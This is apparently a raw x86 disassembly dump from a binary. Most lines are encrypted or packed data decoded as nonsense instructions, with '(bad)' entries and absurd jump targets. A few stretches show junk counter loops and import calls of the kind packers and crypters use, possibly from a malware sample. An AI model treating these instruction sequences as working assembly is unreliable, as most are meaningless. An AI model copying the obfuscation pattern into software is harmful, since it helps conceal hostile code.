  4081af:	sub    dh,BYTE PTR [ecx]
  4081b1:	cmp    DWORD PTR [eax+0x324627c0],esi
  4081b7:	stos   BYTE PTR es:[edi],al
  4081b8:	pop    esp
  4081b9:	icebp  
  4081ba:	aad    0xa1
  4081bc:	lds    ebx,FWORD PTR [ecx]
  4081be:	jmp    0xe6ef:0xd779c603
  4081c5:	repz cmp al,0x9f
  4081c8:	cmp    ah,ch
  4081ca:	repnz inc edi
  4081cc:	out    dx,eax
  4081cd:	xchg   BYTE PTR [eax+0x7b8d2131],bh
  4081d3:	add    ch,ah
  4081d5:	(bad)  
  4081d6:	cmp    BYTE PTR [esi+edx*8],cl
  4081d9:	jo     0x4081fb
  4081db:	adc    DWORD PTR [ecx],eax
  4081dd:	xchg   ecx,eax
  4081de:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  4081df:	mov    ch,0xdd
  4081e1:	repz push ds
  4081e3:	stos   DWORD PTR es:[edi],eax
  4081e4:	push   cs
  4081e5:	jnp    0x4081cd
  4081e7:	jg     0x4081a7
  4081e9:	nop
  4081ea:	(bad)  
  4081eb:	iret   
  4081ec:	jo     0x40824d
  4081ee:	test   esp,ebx
  4081f0:	bound  esp,QWORD PTR [edx]
  4081f2:	xchg   BYTE PTR [edi],bh
  4081f4:	add    DWORD PTR cs:[ecx-0x7d],ebx
  4081f8:	and    al,0xc7
  4081fa:	iret   
  4081fb:	xor    DWORD PTR [ecx-0x25],ecx
  4081fe:	xor    bh,BYTE PTR [edi+0x35]
  408201:	pop    es
  408202:	(bad)  
  408203:	cvtdq2ps xmm0,xmm1
  408206:	sbb    DWORD PTR [esp+ecx*2],esp
  408209:	cld    
  40820a:	inc    edi
  40820b:	xchg   ecx,eax
  40820c:	jge    0x408205
  40820e:	fdiv   DWORD PTR [ecx+0xd]
  408211:	sub    al,0x37
  408213:	mov    al,ds:0xb2368df2
  408218:	fcmovb st,st(2)
  40821a:	xchg   BYTE PTR [ecx-0x1d],dl
  40821d:	retf   
  40821e:	jne    0xda2b7a35
  408224:	jae    0x4081e3
  408226:	sar    DWORD PTR cs:[edi+0x43],cl
  40822a:	in     eax,0x21
  40822c:	jle    0x408254
  40822e:	mov    ecx,ecx
  408230:	pop    ecx
  408231:	sub    dh,ch
  408233:	sub    ebx,DWORD PTR ds:0x21ca7fe2
  408239:	pop    ebx
  40823a:	pop    ebx
  40823b:	sbb    eax,0x176c513c
  408240:	add    BYTE PTR ds:0x74920760,cl
  408246:	xchg   esi,esi
  408248:	xchg   ebp,eax
  408249:	mov    esp,es
  40824b:	mov    ecx,0x30cd131
  408250:	adc    eax,0xf38b0f5f
  408255:	lods   al,BYTE PTR ds:[esi]
  408256:	mov    ds:0xc7e7a412,al
  40825b:	or     eax,0xead35386
  408260:	das    
  408261:	out    0x7a,al
  408263:	in     eax,0x8a
  408265:	inc    eax
  408266:	or     al,0xbe
  408268:	cmc    
  408269:	sbb    BYTE PTR [edx-0x22],al
  40826c:	or     DWORD PTR [edx-0x5e],esi
  40826f:	shl    ch,0x3a
  408272:	push   eax
  408273:	stc    
  408274:	mov    ds,WORD PTR [ecx-0x72b7e2e7]
  40827a:	dec    edi
  40827b:	(bad)  
  40827c:	pop    edi
  40827d:	out    0x4,ax
  408280:	mov    ds:0x391c8f0c,eax
  408285:	mov    bl,0xf5
  408287:	aam    0x21
  408289:	dec    ebp
  40828a:	add    DWORD PTR [ebx+eiz*4-0x792e864c],ebp
  408291:	mov    ds:0x2eca432d,eax
  408296:	inc    eax
  408297:	inc    esp
  408298:	rol    edi,cl
  40829a:	sub    BYTE PTR [ecx-0x21701fe2],ch
  4082a0:	jecxz  0x40831c
  4082a2:	sub    al,0x9d
  4082a4:	outs   dx,DWORD PTR ds:[esi]
  4082a5:	xor    ebx,esp
  4082a7:	out    dx,eax
  4082a8:	pop    eax
  4082a9:	pop    edx
  4082aa:	cld    
  4082ab:	sub    bl,bh
  4082ad:	cmp    BYTE PTR [edi],al
  4082af:	push   ebp
  4082b0:	mov    WORD PTR [esi],?
  4082b2:	pop    esp
  4082b3:	push   eax
  4082b4:	push   es
  4082b5:	xor    DWORD PTR [edi],esp
  4082b7:	inc    ebp
  4082b8:	mov    dl,0xa9
  4082ba:	mov    gs,edi
  4082bc:	xchg   esi,eax
  4082bd:	rcl    DWORD PTR [edx-0x14],1
  4082c0:	fsubr  QWORD PTR [edi]
  4082c2:	inc    ebx
  4082c3:	fimul  DWORD PTR ds:0xbf3c0edc
  4082c9:	sar    BYTE PTR [ebx+edi*4-0x7b],0xd1
  4082ce:	pop    ebx
  4082cf:	bound  edx,QWORD PTR [edi]
  4082d1:	sbb    BYTE PTR [ebx+0x4d],0x7b
  4082d5:	mov    edx,0x60c74001
  4082da:	fcom   st(0)
  4082dc:	jp     0x40835b
  4082de:	fistp  WORD PTR [ebp-0x4b90e717]
  4082e4:	sti    
  4082e5:	jle    0x40830d
  4082e7:	andps  xmm3,XMMWORD PTR [edx-0x710b546c]
  4082ee:	mov    bh,dl
  4082f0:	jae    0x408281
  4082f2:	sub    al,0x8d
  4082f4:	in     al,0xb4
  4082f6:	retf   
  4082f7:	out    dx,eax
  4082f8:	sub    al,0x84
  4082fa:	pop    esi
  4082fb:	mov    ds:0xa266b71c,al
  408300:	jecxz  0x408370
  408302:	int    0x77
  408304:	mov    al,gs:0xacc9a4b8
  40830a:	jmp    0x98b9:0x1d78c2e3
  408311:	daa    
  408312:	inc    esp
  408313:	xor    edx,ebp
  408315:	fcmovu st,st(7)
  408317:	das    
  408318:	inc    BYTE PTR [edx+0x22434451]
  40831e:	xchg   ecx,eax
  40831f:	sub    BYTE PTR [edx],al
  408321:	dec    esi
  408322:	imul   ebp,eax,0xffffffa8
  408325:	retf   
  408326:	ret    0x3467
  408329:	add    ebx,ebp
  40832b:	xchg   DWORD PTR [ebp+0xf],ecx
  40832e:	xor    DWORD PTR [esi],ebp
  408330:	neg    DWORD PTR [ecx-0x22]
  408333:	cmp    cl,BYTE PTR [ebp-0x5ba9131b]
  408339:	sbb    bh,BYTE PTR es:[edx]
  40833c:	nop
  40833d:	jl     0x40839b
  40833f:	and    DWORD PTR [esi-0x14],ebx
  408342:	inc    eax
  408343:	xor    BYTE PTR [ebx],ch
  408345:	out    0x81,al
  408347:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  408348:	sbb    ebp,ebx
  40834a:	or     al,0x50
  40834c:	into   
  40834d:	leave  
  40834e:	stos   DWORD PTR es:[edi],eax
  40834f:	lds    edx,FWORD PTR [ecx+ecx*4-0x3dcc3609]
  408356:	cmp    eax,0x69ca0b32
  40835b:	je     0x4072df
  408361:	mov    eax,DWORD PTR [ebp-0x10]
  408364:	add    DWORD PTR [eax],0x7403504
  40836a:	jmp    0x4072df
  40836f:	mov    eax,DWORD PTR [ebp-0x1c]
  408372:	cmp    DWORD PTR [eax],edi
  408374:	je     0x4072df
  40837a:	mov    eax,0x800f1c81
  40837f:	jmp    0x4072e6
  408384:	push   ebp
  408385:	mov    ebp,esp
  408387:	sub    esp,0x60
  40838a:	mov    DWORD PTR ds:0x4345ef,0x17
  408394:	cmp    DWORD PTR ds:0x4345ef,0x0
  40839b:	je     0x4083fd
  4083a1:	cmp    DWORD PTR ds:0x4345ef,0x6
  4083a8:	jne    0x4083c8
  4083ae:	push   0x434653
  4083b3:	push   0x4c23
  4083b8:	push   0x3f32
  4083bd:	push   0x4c42
  4083c2:	call   DWORD PTR ds:0x413288
  4083c8:	cmp    DWORD PTR ds:0x4345ef,0x7
  4083cf:	jne    0x4083e0
  4083d5:	mov    eax,ds:0x4345ef
  4083da:	dec    eax
  4083db:	mov    ds:0x4345ef,eax
  4083e0:	mov    eax,ds:0x4345ef
  4083e5:	dec    eax
  4083e6:	mov    ds:0x4345ef,eax
  4083eb:	jmp    0x408394
  4083f0:	movzx  eax,BYTE PTR ds:0x434713
  4083f7:	sbb    DWORD PTR ds:0x434603,eax
  4083fd:	mov    eax,DWORD PTR [ebp+0x8]
  408400:	sbb    DWORD PTR ds:0x434687,0x4487
  40840a:	push   ebx
  40840b:	xor    ebx,ebx
  40840d:	or     ebx,DWORD PTR ds:0x434683
  408413:	sbb    DWORD PTR ds:0x434713,ebx
  408419:	push   esi
  40841a:	jmp    0x4086a2
  40841f:	jmp    DWORD PTR [ecx]
  408421:	lahf   
  408422:	xchg   esp,eax
  408423:	mov    eax,ds:0xe73db59c
  408428:	sbb    bh,bl
  40842a:	(bad)  
  40842b:	mov    eax,ds:0xfb742b2f
  408430:	fidivr WORD PTR [esi+0x7e]
  408433:	loope  0x4084ad
  408435:	jle    0x4084b5
  408437:	addr16 mov esp,0xb03e32c0
  40843d:	int    0x3c
  40843f:	sub    BYTE PTR [edi+0x1b],dh
  408442:	mov    esi,0xd93977d2
  408447:	iret   
  408448:	xchg   esp,eax
  408449:	jge    0x4083f9
  40844b:	lds    edx,FWORD PTR [edi-0x1c223803]
  408451:	adc    BYTE PTR [ebx-0x79],0xa9
  408455:	hlt    
  408456:	push   ss
  408457:	iret   
  408458:	enter  0xfbcf,0x34
  40845c:	mov    dh,0x66
  40845e:	xor    DWORD PTR ds:0xf13f9c12,ebx
  408464:	popa   
  408465:	push   es
  408466:	xchg   ebp,eax
  408467:	out    dx,al
  408468:	outs   dx,DWORD PTR ds:[esi]
  408469:	mov    al,ds:0x7edccf72
  40846e:	xchg   DWORD PTR [esi-0x55],edi
  408471:	sub    DWORD PTR [esi+edi*8],ecx
  408474:	mov    ah,0x40
  408476:	fist   WORD PTR [ecx]
  408478:	(bad)  
  40847a:	jae    0x408454
  40847c:	scas   eax,DWORD PTR es:[edi]
  40847d:	dec    ebp
  40847e:	xor    al,0x85
  408480:	outs   dx,BYTE PTR ds:[esi]
  408481:	bound  eax,QWORD PTR [edi+ebx*1]
  408484:	jae    0x40849d
  408486:	outs   dx,BYTE PTR ds:[esi]
  408487:	sbb    eax,0xf7a3f064
  40848c:	dec    eax
  40848d:	unpcklps xmm0,xmm7
  408490:	adc    ecx,DWORD PTR [edx]
  408492:	ror    BYTE PTR ds:[eax+0xba03920],1
  408499:	ins    BYTE PTR es:[edi],dx
  40849a:	cmp    eax,esi
  40849c:	pop    edx
  40849d:	cmp    bl,BYTE PTR [edi]
  40849f:	lds    esi,FWORD PTR [esi-0x4fc69699]
  4084a5:	pop    ds
  4084a6:	and    eax,0x6fcb23a8
  4084ab:	and    eax,eax
  4084ad:	xor    al,0x8a
  4084af:	ja     0x40844f
  4084b1:	jmp    0xf7915b1c
  4084b6:	retf   
  4084b7:	int3   
  4084b8:	in     eax,dx
  4084b9:	sub    edi,DWORD PTR [eax]
  4084bb:	and    esi,DWORD PTR [ecx+ecx*8-0x2a]
  4084bf:	dec    ebp
  4084c0:	ror    BYTE PTR [ebp-0x6a5f7],1
  4084c6:	pop    eax
  4084c7:	sub    eax,0x5b694619
  4084cc:	xor    eax,0xe26ae7c2
  4084d1:	icebp  
  4084d2:	in     ax,0xc
  4084d5:	jmp    0x40847d
  4084d7:	lds    edi,FWORD PTR [ebx-0x1c]
  4084da:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  4084db:	mov    esp,0xbc0ea905
  4084e0:	mov    al,es:0x3d5263e3
  4084e6:	std    
  4084e7:	jmp    0xd4abc442
  4084ec:	stos   DWORD PTR es:[edi],eax
  4084ed:	or     eax,0xdb4016c5
  4084f2:	pop    ebp
  4084f3:	sbb    al,bh
  4084f5:	lea    ecx,[ebx+0x14]
  4084f8:	mov    edi,0x6c6e9a69
  4084fd:	gs xchg ebp,eax
  4084ff:	and    BYTE PTR [edx],ch
  408501:	fcom   st(4)
  408503:	loope  0x40848c
  408505:	(bad)  [edi]
  408507:	and    edx,DWORD PTR [ebx-0x6ca777c9]
  40850d:	out    0x17,al
  40850f:	sbb    eax,DWORD PTR [ebp+0x5]
  408512:	outs   dx,BYTE PTR ds:[esi]
  408513:	and    esi,DWORD PTR [ebp-0x665c26fa]
  408519:	inc    esi
  40851a:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  40851b:	xchg   BYTE PTR ds:0x9015f007,dl
  408521:	xchg   edx,eax
  408522:	inc    esi
  408523:	in     al,dx
  408524:	pushw  0xf8ce
  408528:	pop    esi
  408529:	cs pop esi
  40852b:	es dec ecx
  40852d:	pop    ecx
  40852e:	jl     0x408556
  408530:	sar    BYTE PTR [esi],1
  408532:	fsub   QWORD PTR [esp+esi*8-0x70]
  408536:	xor    BYTE PTR [ebx],ch
  408538:	jae    0x408579
  40853a:	in     eax,dx
  40853b:	jge    0x4084f6
  40853d:	into   
  40853e:	sar    BYTE PTR [bp+0x789d],1
  408543:	mov    eax,ds:0x7d406594
  408548:	push   es
  408549:	pusha  
  40854a:	or     cl,BYTE PTR [ebx]
  40854c:	fiadd  WORD PTR [ecx+0x2]
  40854f:	mov    ds:0x5b77b1a9,eax
  408554:	dec    esi
  408555:	or     ch,BYTE PTR [edi]
  408557:	cmp    eax,0x297310fe
  40855c:	mov    ebp,0xa3b3d08e
  408561:	xor    eax,0x3a8e0e51
  408566:	test   eax,0x8a0ef5fd
  40856b:	or     dl,ch
  40856d:	fiadd  WORD PTR [ebp+ebp*8+0x50f49b20]
  408574:	inc    DWORD PTR [ebp-0x35]
  408577:	dec    edx
  408578:	xchg   esi,eax
  408579:	xchg   ebx,eax
  40857a:	and    cl,bh
  40857c:	adc    BYTE PTR [esi-0x2c3408ae],bl
  408582:	sti    
  408583:	shl    BYTE PTR [edi+0x28c9b5d6],1
  408589:	inc    esp
  40858a:	out    dx,al
  40858b:	pop    ebx
  40858c:	pop    esi
  40858d:	or     bh,dl
  40858f:	ins    BYTE PTR es:[edi],dx
  408590:	xchg   edx,eax
  408591:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  408592:	adc    al,BYTE PTR [edx+0x6151b786]
  408598:	out    0xf3,eax
  40859a:	xchg   ecx,eax
  40859b:	add    dh,BYTE PTR [eax-0x6082349c]
  4085a1:	xchg   edx,eax
  4085a2:	das    
  4085a3:	stos   DWORD PTR es:[edi],eax
  4085a4:	xchg   edi,eax
  4085a5:	xchg   ebx,eax
  4085a6:	push   esp
  4085a7:	out    0xdf,al
  4085a9:	push   ebx
  4085aa:	xor    al,0x91
  4085ac:	not    BYTE PTR [edi-0x69]
  4085af:	dec    ecx
  4085b0:	push   esp
  4085b1:	(bad)  [edx-0x61]
  4085b4:	sub    BYTE PTR [ebp-0x14a6f395],dl
  4085ba:	cli    
  4085bb:	add    eax,0x6fe9d86c
  4085c0:	test   al,0x7f
  4085c2:	jno    0x408583
  4085c4:	cs add al,ch
  4085c7:	and    edi,DWORD PTR [edx]
  4085c9:	push   0xffffff96
  4085cb:	outs   dx,DWORD PTR ds:[esi]
  4085cc:	mov    cs,WORD PTR [esi+0x29c7bbac]
  4085d2:	mov    cl,0x7d
  4085d4:	adc    bl,dh
  4085d6:	sti    
  4085d7:	pop    eax
  4085d8:	icebp  
  4085d9:	push   edx
  4085da:	mov    ds:0x87bc9411,al
  4085df:	mov    ch,0xac
  4085e1:	push   DWORD PTR [ecx+edi*1+0x4874cad6]
  4085e8:	sbb    cl,BYTE PTR [ebp+0x3f]
  4085eb:	pop    esi
  4085ec:	jl     0x408604
  4085ee:	jns    0x408649
  4085f0:	cld    
  4085f1:	xchg   esp,eax
  4085f2:	mov    al,ds:0xb8af1c3
  4085f7:	fidivr WORD PTR [eax-0x3e]
  4085fa:	nop
  4085fb:	retf   0x77a5
  4085fe:	icebp  
  4085ff:	clc    
  408600:	test   al,0x51
  408602:	pop    ss
  408603:	aaa    
  408604:	in     eax,0x16
  408606:	enter  0xac72,0xba
  40860a:	addr16 out 0xc9,al
  40860d:	les    eax,FWORD PTR [eax+edi*8]
  408610:	int    0xab
  408612:	dec    ecx
  408613:	aas    
  408614:	and    DWORD PTR [ecx+edi*2+0x7626712c],esp
  40861b:	inc    edi
  40861c:	outs   dx,BYTE PTR ds:[esi]
  40861d:	stos   BYTE PTR es:[edi],al
  40861e:	sbb    BYTE PTR [esi+0x11],al
  408621:	loop   0x408680
  408623:	jne    0x408630
  408625:	pop    edx
  408626:	enter  0x3ea1,0x85
  40862a:	pop    eax
  40862b:	data16 jnp 0x4085ee
  40862e:	mov    ecx,0x3791ae4a
  408633:	ins    BYTE PTR es:[edi],dx
  408634:	xor    al,0x8f
  408636:	or     edi,ebx
  408638:	inc    ebx
  408639:	hlt    
  40863a:	jg     0x408676
  40863c:	sub    bl,ah
  40863e:	pusha  
  40863f:	jmp    0xd1f0a2d
  408644:	jecxz  0x40868f
  408646:	(bad)  
  408647:	sbb    al,0xc2
  408649:	cmp    esp,DWORD PTR [ecx-0xb73c8d0]
  40864f:	mov    ebx,0x14bb2a23
  408654:	cli    
  408655:	into   
  408656:	lea    ecx,ds:0x9e4e494a
  40865c:	pop    esi
  40865d:	ret    0xe5b3
  408660:	pop    ebx
  408661:	(bad)  
  408662:	cld    
  408663:	cmp    DWORD PTR [edx+0x50],eax
  408666:	xchg   BYTE PTR [edx+ecx*1+0x62c323e7],ch
  40866d:	push   eax
  40866e:	addr16 or edi,edx
  408671:	or     cl,BYTE PTR [edi+esi*4+0x5a]
  408675:	sar    DWORD PTR [ecx+0x2b],1
  408678:	dec    esi
  408679:	enter  0x82cd,0x26
  40867d:	xor    ecx,DWORD PTR [ecx-0x50]
  408680:	push   ebp
  408681:	xchg   esp,eax
  408682:	mov    ds:0xaaa1e66e,al
  408687:	sbb    al,0x46
  408689:	add    ebp,DWORD PTR [eax]
  40868b:	mov    BYTE PTR [eax],0x6f
  40868e:	add    esi,DWORD PTR [eax+0x59196f33]
  408694:	or     ecx,DWORD PTR ds:0x4fe7e60d
  40869a:	mov    esp,0x833269c9
  40869f:	jg     0x4086d2
  4086a1:	loopne 0x408661
  4086a3:	push   ecx
  4086a4:	or     BYTE PTR [ecx+0x7],dl
  4086a7:	and    DWORD PTR ds:0x4345ef,0x0
  4086b1:	mov    ebx,DWORD PTR ds:0x4345ef
  4086b7:	inc    ebx
  4086b8:	mov    DWORD PTR ds:0x4345ef,ebx
  4086be:	cmp    DWORD PTR ds:0x4345ef,0x8
  4086c5:	jne    0x4086d6
  4086cb:	push   0x2214
  4086d0:	call   DWORD PTR ds:0x41328c
  4086d6:	cmp    DWORD PTR ds:0x4345ef,0x7
  4086dd:	jne    0x4086f2
  4086e3:	xor    ebx,ebx
  4086e5:	or     ebx,DWORD PTR ds:0x4345ef
  4086eb:	inc    ebx
  4086ec:	mov    DWORD PTR ds:0x4345ef,ebx
  4086f2:	cmp    DWORD PTR ds:0x4345ef,0x11
  4086f9:	jb     0x4086b1
  4086ff:	xor    eax,esi
  408701:	or     ebx,0x4275
  408707:	mov    ebx,0x327299
  40870c:	add    eax,ebx
  40870e:	push   edi
  40870f:	sub    edi,DWORD PTR ds:0x434683
  408715:	mov    DWORD PTR [ebp-0x18],eax
  408718:	xor    edi,0x561f
  40871e:	jmp    0x4089a6
  408723:	push   esi
  408724:	ja     0x40875d
  408726:	push   ecx
  408727:	aaa    
  408728:	push   ecx
  408729:	jo     0x40879c
  40872b:	(bad)  
  40872c:	mov    eax,0xc42e3fc8
  408731:	pop    ecx
  408732:	sub    DWORD PTR [esi-0x28],0x7e
  408736:	jle    0x408719
  408738:	js     0x4087b8
  40873a:	jle    0x40876f
  40873c:	call   0xd94d3cab
  408741:	retw   
  408743:	hlt    
  408744:	push   esi
  408745:	pop    es
  408746:	aas    
  408747:	push   0xffffff94
  408749:	and    al,0xde
  40874b:	popa   
  40874c:	fwait
  40874d:	aas    
  40874e:	cmc    
  40874f:	retf   0xbbf2
  408752:	pop    ecx
  408753:	loope  0x4087a7
  408755:	imul   ecx,eax,0x281fc64a
  40875b:	xor    BYTE PTR [esi],0x55
  40875e:	xor    cl,BYTE PTR [edx+edx*8-0x74dc87c1]
  408765:	data16 stos BYTE PTR es:[edi],al
  408767:	cmp    al,0xe0
  408769:	push   es
  40876a:	ja     0x4087ca
  40876c:	fcomip st,st(3)
  40876e:	es pop edi
  408770:	pop    edx
  408771:	loop   0x40873b
  408773:	push   ebp
  408774:	loop   0x4087f1
  408776:	inc    esi
  408777:	int    0x58
  408779:	ret    0xfeb1
  40877c:	adc    DWORD PTR [edx],ecx
  40877e:	jb     0x4087e6
  408780:	mov    dh,0x23
  408782:	mov    ds:0xb1036896,al
  408787:	lahf   
  408788:	les    esi,FWORD PTR [ecx-0x510fb8a6]
  40878e:	ins    DWORD PTR es:[edi],dx
  40878f:	addr16 cdq 
  408791:	cmp    esi,eax
  408793:	repz ror BYTE PTR [edx],0x5a
  408797:	mul    BYTE PTR [ecx+0x5a]
  40879a:	sub    ebx,0x7a
  40879d:	xchg   edx,eax
  40879e:	mov    gs,WORD PTR [edi-0x35]
  4087a1:	mov    dh,0x87
  4087a3:	lahf   
  4087a4:	push   ecx
  4087a5:	lahf   
  4087a6:	ins    DWORD PTR es:[edi],dx
  4087a7:	stos   DWORD PTR es:[edi],eax
  4087a8:	push   cs
  4087a9:	enter  0x2826,0x15
  4087ad:	xchg   esi,eax
  4087ae:	mov    eax,0xa4814cbd
  4087b3:	popa   
  4087b4:	or     esp,esp
  4087b6:	aam    0xb7
  4087b8:	scas   eax,DWORD PTR es:[edi]
  4087b9:	pop    esi
  4087ba:	sahf   
  4087bb:	xlat   BYTE PTR ds:[ebx]
  4087bc:	xor    cl,al
  4087be:	popa   
  4087bf:	ins    BYTE PTR es:[edi],dx
  4087c0:	pcmpeqd mm2,QWORD PTR [eax-0x48bf49ef]
  4087c7:	mov    esp,DWORD PTR [ebx+edi*1]
  4087ca:	je     0x408792
  4087cc:	jge    0x40878d
  4087ce:	push   ecx
  4087cf:	jbe    0x408751
  4087d1:	sub    bl,BYTE PTR [ebx-0x7a2f41a9]
  4087d7:	call   0xdae9955e
  4087dc:	in     al,0x71
  4087de:	or     DWORD PTR [edi+0x3a],edx
  4087e1:	xchg   DWORD PTR [edx],ebx
  4087e3:	int    0x9d
  4087e5:	stos   BYTE PTR es:[edi],al
  4087e6:	fisubr DWORD PTR [eax+0x74]
  4087e9:	mov    ds:0xe8165c0b,al
  4087ee:	inc    ebp
  4087ef:	push   ds
  4087f0:	js     0x4087d6
  4087f2:	(bad)  
  4087f3:	fnstcw WORD PTR [edi]
  4087f5:	add    al,0xb3
  4087f7:	es dec ecx
  4087f9:	or     BYTE PTR [ecx+0x244047fb],bh
  4087ff:	cmp    eax,0x31b90121
  408804:	adc    ebp,DWORD PTR [edi]
  408806:	jle    0x40881e
  408808:	sub    al,0x72
  40880a:	or     bh,BYTE PTR [esi+0x28]
  40880d:	pop    edx
  40880e:	je     0x4087e2
  408810:	sub    eax,0x4662c9d6
  408815:	and    esp,DWORD PTR [esi+0x2e9380e]
  40881b:	leave  
  40881c:	stos   DWORD PTR es:[edi],eax
  40881d:	fwait
  40881e:	in     al,dx
  40881f:	mov    eax,ds:0xc969e192
  408824:	je     0x408825
  408826:	jb     0x4087ae
  408828:	(bad)
  40882d:	mov    dl,0xaa
  40882f:	mov    ds:0x825f7f4,al
  408834:	fwait
  408835:	rol    ch,0x5d
  408838:	adc    cl,al
  40883a:	clc    
  40883b:	jmp    0xd581f634
  408840:	mov    ?,WORD PTR [ecx-0x501c020e]
  408846:	jmp    0x4e39:0x2489164c
  40884d:	(bad)  
  40884e:	pop    ecx
  40884f:	or     eax,0xa47a2808
  408854:	jb     0x408867
  408856:	pop    esi
  408857:	mov    ch,0x6c
  408859:	test   DWORD PTR [edi-0x26],esi
  40885c:	outs   dx,BYTE PTR ds:[esi]
  40885d:	not    dl
  40885f:	sbb    eax,0x8c83651a
  408864:	(bad)  
  408865:	repz (bad) 
  408867:	icebp  
  408868:	jne    0x4088df
  40886a:	shl    DWORD PTR [ebx+edx*8+0x1f73bbf1],1
  408871:	jmp    0x5b375044
  408876:	push   esp
  408877:	inc    esi
  408878:	shl    BYTE PTR [edi+0x52feeae4],0x32
  40887f:	pop    ds
  408880:	inc    ebx
  408881:	push   ss
  408882:	loopne 0x4088e4
  408884:	mov    ?,WORD PTR [edx]
  408886:	test   BYTE PTR ds:0x59a64c27,ah
  40888c:	(bad)  
  40888d:	not    eax
  40888f:	dec    DWORD PTR [edi]
  408891:	loopne 0x408829
  408893:	mov    ah,0xa7
  408895:	push   edx
  408896:	add    BYTE PTR [ecx+esi*1],dh
  408899:	sbb    cl,dh
  40889b:	dec    edi
  40889c:	std    
  40889d:	or     BYTE PTR [ebx+0x16df39e2],dl
  4088a3:	fst    st(0)
  4088a5:	lea    edx,[edi+eiz*8]
  4088a8:	mov    al,0xeb
  4088aa:	mov    ebx,0xe7d20f6d
  4088af:	sub    ecx,DWORD PTR [esi-0x59]
  4088b2:	sbb    cl,BYTE PTR [esi+esi*8-0x4f]
  4088b6:	mov    eax,ds:0xca491840
  4088bb:	retf   0x6de8
  4088be:	inc    esp
  4088bf:	ja     0x408936
  4088c1:	pop    ss
  4088c2:	dec    edi
  4088c3:	test   al,0xde
  4088c5:	shl    DWORD PTR [edx],1
  4088c7:	mov    edx,0x81ba7578
  4088cc:	in     eax,0x6
  4088ce:	xor    BYTE PTR [ecx-0x41ba6525],ah
  4088d4:	or     BYTE PTR [edi-0x70],ah
  4088d7:	retf   
  4088d8:	aad    0x3e
  4088da:	popf   
  4088db:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  4088dc:	outs   dx,DWORD PTR ds:[esi]
  4088dd:	aam    0xe2
  4088df:	mov    bh,0x81
  4088e1:	add    DWORD PTR [ecx+0x31],0xffffffb7
  4088e5:	mov    ds:0x4dce180,eax
  4088ea:	or     ch,bh
  4088ec:	mov    ds,WORD PTR [ecx-0x24]
  4088ef:	fist   WORD PTR [ebx]
  4088f1:	data16 (bad) cs:0x2fdb2eee
  4088f9:	stos   DWORD PTR es:[edi],eax
  4088fa:	jle    0x408893
  4088fc:	ret    
  4088fd:	lods   al,BYTE PTR ds:[esi]
  4088fe:	(bad)  
  408900:	xor    DWORD PTR [esi],esi
  408902:	xchg   BYTE PTR [ecx],bh
  408904:	int    0x26
  408906:	xchg   esi,eax
  408907:	xor    al,BYTE PTR [edx]
  408909:	in     eax,dx
  40890a:	xchg   DWORD PTR [ecx+0x37d0c574],eax
  408910:	xor    DWORD PTR [edx-0x13421b6e],esp
  408916:	add    al,0xa8
  408918:	push   ecx
  408919:	dec    esi
  40891a:	push   DWORD PTR [eax+0x41abd2c2]
  408920:	sub    eax,0x4b9c2323
  408925:	mov    dl,0xc2
  408927:	dec    esp
  408928:	dec    ebp
  408929:	ds pushf 
  40892b:	adc    ebx,DWORD PTR [eax]
  40892d:	iret   
  40892e:	cmp    eax,0x6a0c458a
  408933:	or     al,BYTE PTR [ebx]
  408935:	out    dx,al
  408936:	into   
  408937:	hlt    
  408938:	test   DWORD PTR [esi+0x4a9ad13e],esp
  40893e:	das    
  40893f:	cmp    al,0xff
  408941:	inc    ebx
  408942:	(bad)  
  408943:	pop    edx
  408944:	mov    bh,0xcf
  408946:	test   bh,al
  408948:	and    DWORD PTR [ecx-0x6eec1f88],edi
  40894e:	mov    al,0x21
  408950:	into   
  408951:	sub    edi,edi
  408953:	adc    BYTE PTR ds:0xa8522434,ch
  408959:	mov    ebx,0xe3989b49
  40895e:	add    bh,BYTE PTR [eax+0x7959c9f9]
  408964:	mov    dl,0x28
  408966:	movzx  esi,BYTE PTR [eax]
  408969:	sbb    ah,ch
  40896b:	adc    edx,ebx
  40896d:	xchg   ebp,eax
  40896e:	dec    esp
  40896f:	sub    eax,0xdd6f99cc
  408974:	retf   
  408975:	push   cs
  408976:	je     0x4089a0
  408978:	mov    ebp,0x3443a5b2
  40897d:	scas   eax,DWORD PTR es:[edi]
  40897e:	push   es
  40897f:	xor    bh,dl
  408981:	jmp    0x40895e
  408983:	jmp    0x4089b6
  408985:	mov    ebp,DWORD PTR [ebp+0x549d6d45]
  40898b:	jg     0x4089b6
  40898d:	icebp  
  40898e:	pushf  
  40898f:	sub    bh,BYTE PTR [ebx+0x21]
  408992:	inc    eax
  408993:	scas   al,BYTE PTR es:[edi]
  408994:	push   ss
  408995:	aaa    
  408996:	(bad)  
  408997:	stc    
  408998:	fwait
  408999:	dec    eax
  40899a:	cdq    
  40899b:	scas   al,BYTE PTR es:[edi]
  40899c:	sbb    ebx,edx
  40899e:	inc    ebp
  40899f:	jbe    0x4089aa
  4089a1:	fstp   QWORD PTR [eax]
  4089a3:	xchg   esi,eax
  4089a4:	cmc    
  4089a5:	pop    ds
  4089a6:	mov    edi,DWORD PTR [ebp+0x8]
  4089a9:	xor    edi,esi
  4089ab:	not    DWORD PTR ds:0x4345eb
  4089b1:	mov    DWORD PTR [ebp-0xc],0xf89c85f6
  4089b8:	mov    DWORD PTR [ebp-0x10],0xf89c8736
  4089bf:	add    edi,ebx
  4089c1:	jmp    0x4092cd
  4089c6:	cmp    edi,0x3f
  4089c9:	jmp    0x408c51
  4089ce:	adc    dl,BYTE PTR [ebx-0x524adccb]
  4089d4:	sbb    al,0xb3
  4089d6:	xchg   ebx,eax
  4089d7:	pop    ds
  4089d8:	adc    cl,cl
  4089da:	sti    
  4089db:	push   eax
  4089dc:	jo     0x408975
  4089de:	rcr    ebx,1
  4089e0:	jle    0x408a60
  4089e2:	loope  0x408a5c
  4089e4:	jle    0x408a64
  4089e6:	push   ss
  4089e7:	sub    al,0xd9
  4089e9:	mov    eax,0x27f2ae03
  4089ee:	mov    ?,WORD PTR [ecx+0x26]
  4089f1:	les    ebx,FWORD PTR [ebx]
  4089f3:	icebp  
  4089f4:	cmp    edi,ebp
  4089f6:	mov    DWORD PTR [ecx-0x66],edx
  4089f9:	mov    ds:0xd680d9aa,al
  4089fe:	neg    bh
